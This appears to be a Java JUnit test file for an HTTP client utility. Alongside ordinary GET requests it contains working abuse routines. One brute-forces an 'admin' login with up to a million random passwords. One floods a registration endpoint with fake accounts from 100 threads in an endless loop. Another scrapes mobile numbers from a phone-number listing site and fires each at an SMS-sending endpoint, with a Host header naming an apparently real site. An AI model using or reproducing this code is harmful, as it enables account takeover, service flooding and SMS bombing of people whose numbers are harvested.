package top.danny.tools.net.httpclient;

import com.alibaba.fastjson.JSON;
import com.gargoylesoftware.htmlunit.html.HtmlDivision;
import com.gargoylesoftware.htmlunit.html.HtmlHeading2;
import com.gargoylesoftware.htmlunit.html.HtmlPage;
import com.gargoylesoftware.htmlunit.javascript.host.html.HTMLDivElement;
import com.gargoylesoftware.htmlunit.javascript.host.html.HTMLLIElement;
import org.apache.http.HttpEntity;
import org.apache.http.NameValuePair;
import org.apache.http.ParseException;
import org.apache.http.client.methods.CloseableHttpResponse;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.conn.ConnectTimeoutException;
import org.apache.http.impl.client.CloseableHttpClient;
import org.apache.http.util.EntityUtils;
import org.junit.Test;
import top.danny.spider.htmlunit.base.RequestData;
import top.danny.spider.htmlunit.base.RequestSender;
import top.danny.tools.collection.ListUtil;
import top.danny.tools.thread.consumeTime.Executor;
import top.danny.tools.thread.consumeTime.ExecutorInterface;

import java.io.IOException;
import java.net.SocketTimeoutException;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Random;

/**
 * @author huyuyang@lxfintech.com
 * @Title: HttpClientRequestUtilTest
 * @Copyright: Copyright (c) 2016
 * @Description:
 * @Company: lxjr.com
 * @Created on 2017-07-20 13:57:16
 */
public class HttpClientRequestUtilTest {

    @Test
    public void sendGetTest() {
        while (true) {
            Executor executor = new Executor(new ExecutorInterface() {
                @Override
                public void executeJob() {
                    System.out.println("Job begin……");
                    get2();
                    System.out.println("Job end……");
                }
            });
            executor.start(1000);
            try {
                Thread.sleep(1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    @Test
    public void get2() {
        Integer userId = getInteger(1, 5);
        String url = "http://www.easysharing.club/";
        try {
            CloseableHttpClient httpClient = HttpClientRequestUtil.createHttpClient();
            HttpGet httpGet = new HttpGet(url);
            CloseableHttpResponse response = httpClient.execute(httpGet);
            String result = getResult(response, "UTF-8");
            //System.out.println(result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private Integer getInteger(int from, int to) {
        Integer i = new Random().nextInt(to);
        if (i < from) {
            return getInteger(from, to);
        }
        return i;
    }

    @Test
    public void get1() {
        String url = "";
        try {
            CloseableHttpClient httpClient = HttpClientRequestUtil.createHttpClient();
            HttpGet httpGet = new HttpGet("http://10.5.118.37:8082/bg/user/login.shtml");
            httpGet.setHeader("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6630586)");
            CloseableHttpResponse response = httpClient.execute(httpGet);
            String result = getResult(response, "UTF-8");
            //System.out.println(result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void get() {
        String url = "";
        try {
            CloseableHttpClient httpClient = HttpClientRequestUtil.createHttpClient();
            HttpGet httpGet = new HttpGet("http://localhost:10086/front/index.html");
            httpGet.setHeader("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6630586)");
            CloseableHttpResponse response = httpClient.execute(httpGet);
            String result = getResult(response, "UTF-8");
            System.out.println(result);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static String getResult(CloseableHttpResponse httpResponse, String charset) throws ParseException, IOException {
        String result = null;
        if (httpResponse == null) {
            return result;
        }
        HttpEntity entity = httpResponse.getEntity();
        if (entity == null) {
            return result;
        }
        result = EntityUtils.toString(entity, charset);
        EntityUtils.consume(entity);// 关闭应该关闭的资源，适当的释放资源 ;也可以把底层的流给关闭了
        return result;
    }

    @Test
    public void sendPostTest() {
        NameValuePair pwd = null;
        String url = "loginRequestUrl";
        for (int i = 0; i < 1000000; i++) {
            List<NameValuePair> nameValuePairList = getNameValuePairList();
            pwd = getPasswordNameValuePair(i);
            nameValuePairList.add(pwd);
            String result = HttpHandler.sendPost(url, nameValuePairList);
            System.out.println("第" + i + "次登陆，密码：" + pwd.getValue() + "，结果：" + result);
        }
    }

    public List<NameValuePair> getNameValuePairList() {
        List<NameValuePair> nameValuePairList = new ArrayList<>();
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "uid";
            }

            @Override
            public String getValue() {
                return "admin";
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "rid";
            }

            @Override
            public String getValue() {
                return "admin";
            }
        });
        return nameValuePairList;
    }

    private NameValuePair getPasswordNameValuePair(int i) {

        return new NameValuePair() {
            @Override
            public String getName() {
                return "pwd";
            }

            @Override
            public String getValue() {
                return getRandomChar(6);
            }
        };
    }

    public static void main(String[] args) {
        System.out.println("12345678".substring(0,5));
        System.out.println(getRandomChar(10));
    }

    /**
     * JAVA获得0-9,a-z,A-Z范围的随机数
     *
     * @param length 随机数长度
     * @return String
     */
    public static String getRandomChar(int length) {
        char[] chr = {'0', '1', '2', '3', '4', '5', '6', '7', '8', '9',
                'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z',
                'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'};
        Random random = new Random();
        StringBuffer buffer = new StringBuffer();
        for (int i = 0; i < length; i++) {
            buffer.append(chr[random.nextInt(62)]);
        }
        return buffer.toString();
    }

    @Test
    public void sendLoginPostTest() {
        final String url = "http://127.0.0.1:8080/register";
        Executor executor = new Executor(new ExecutorInterface() {
            @Override
            public void executeJob() {
                System.out.println("Job begin……");
                try {
                    while (true) {
                        List<NameValuePair> nameValuePairList = getLoginNameValuePairList(getRandomChar(10));
                        String result = HttpHandler.sendPost(url, nameValuePairList);
                        System.out.println("结果：" + result);
                        System.out.println(Thread.currentThread().getName() + " 执行结束");
                        Thread.sleep(2000);
                    }
                } catch (Exception e) {
                    e.printStackTrace();
                }
                System.out.println("Job end……");
            }
        });
        executor.start(100);

    }

    private List<NameValuePair> getLoginNameValuePairList(final String str) {
        List<NameValuePair> nameValuePairList = new ArrayList<>();
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "username";
            }

            @Override
            public String getValue() {
                return str;
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "email";
            }

            @Override
            public String getValue() {
                return str + "@gmail.com";
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "name";
            }

            @Override
            public String getValue() {
                return str;
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return "password";
            }

            @Override
            public String getValue() {
                return str;
            }
        });
        nameValuePairList.add(new NameValuePair() {
            @Override
            public String getName() {
                return str;
            }

            @Override
            public String getValue() {
                return str;
            }
        });
        return nameValuePairList;
    }

    @Test
    public void catchMobileList(){
        int msgCount=0;
        try{
            for (int i=85;i<59194;i++){
                String url = "http://www.jihaoba.com/shouji/yidong/all-all-all-all-all-all-"+i+".htm";
                List<String> mobileNoList = getMobileList(url);
                System.out.println("爬取结束："+JSON.toJSONString(mobileNoList));
                if (ListUtil.isNotEmpty(mobileNoList)){
                    for (int j=0;j<mobileNoList.size();j++){
                        try{
                            String mobileNo=mobileNoList.get(j);
                            CloseableHttpClient httpClient = HttpClientRequestUtil.createHttpClient();
                            HttpGet httpGet = new HttpGet("http://127.0.0.1/index/login/sendmsm/phone/"+mobileNo);
                            setGetter(httpGet);
                            CloseableHttpResponse response = httpClient.execute(httpGet);
                            String result = getResult(response, "UTF-8");
                            System.out.println(JSON.toJSONString("手机号"+mobileNo+"发送结果："+result));
                            msgCount+=1;
                        }catch (SocketTimeoutException e){
                            j--;
                        }catch (ConnectTimeoutException e){
                            j--;
                        }
                    }
                }
            }
        }catch (Exception e){
            System.out.println("出现异常，已经发送短信条数："+msgCount);
            e.printStackTrace();
        }
    }

    private void setGetter(HttpGet httpGet) {
        httpGet.setHeader("Accept", "*/*");
        httpGet.setHeader("Accept-Encoding", "gzip, deflate");
        httpGet.setHeader("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8");
        httpGet.setHeader("Connection", "keep-alive");
        httpGet.setHeader("Host", "gp18888.cn");
        httpGet.setHeader("Referer", "http://127.0.0.1/index/login/register.html");
        httpGet.setHeader("User-Agent", "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.181 Safari/537.36");
        httpGet.setHeader("X-Requested-With", "XMLHttpRequest");
    }


    public List<String> getMobileList(String htmlPageUrl) {
        List<String> mobileNoList = new ArrayList<>();

        System.out.println("开始爬取：" + htmlPageUrl);
        RequestData requestData = new RequestData("UTF-8", htmlPageUrl, "GET");
        HtmlPage requestResultPage = (HtmlPage) RequestSender.requestAndReturn(requestData);

        String pageUrl = htmlPageUrl;
        mobileNoList = mobileNoNodeList(mobileNoList, requestResultPage);

        return mobileNoList;
    }

    /**
     * 抓取手机号
     */
    private List<String> mobileNoNodeList(List<String> mobileNoList, HtmlPage requestResultPage) {
        try {
            String basePath = "//html/body/div[@class='main p45']/div[@class='sj_ycss fright']/div[@class='list mb20']/div[@class='numbershow']";
            List mobileNoNodeList = requestResultPage.getByXPath(basePath);
            for (int i = 0; i < mobileNoNodeList.size(); i++) {
                HtmlDivision htmlDivision = (HtmlDivision) mobileNoNodeList.get(i);
                String mobileNo = getNumberFromStr(htmlDivision.getTextContent());
                mobileNoList.add(mobileNo);
            }
        } catch (Exception e) {
            return mobileNoList;
        }
        return mobileNoList;
    }

    public String getNumberFromStr(String str) {
        str = str.trim();
        String str2 = "";
        if (str != null && !"".equals(str)) {
            for (int i = 0; i < str.length(); i++) {
                if (str.charAt(i) >= 48 && str.charAt(i) <= 57) {
                    str2 += str.charAt(i);
                }
            }
        }
        if (str2.length()>11){
            str2=str2.substring(0,11);
        }
        return str2;
    }

}
